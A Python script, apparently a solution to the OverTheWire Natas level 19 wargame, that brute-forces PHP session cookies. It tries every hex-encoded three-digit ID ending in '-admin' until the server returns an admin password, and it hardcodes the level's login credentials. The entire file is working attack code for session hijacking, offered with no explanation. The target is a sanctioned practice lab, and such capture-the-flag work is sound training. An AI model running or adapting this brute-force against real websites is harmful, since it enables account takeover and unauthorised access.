#! env python3.9

import requests

site = "http://natas19.natas.labs.overthewire.org/index.php?username="
user = "natas19"
pswd = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
nums = "0123456789"

for i in nums:
    for j in nums:
        for k in nums:
            cookie_txt = "{}{}{}-admin".format(i, j, k).encode().hex()
            cookies = dict(PHPSESSID=cookie_txt)
            r = requests.get(site, auth=(user, pswd), cookies=cookies)
            if "Password" in r.text:
                print(cookie_txt)
                print()
                print(r.text)
                exit(0)


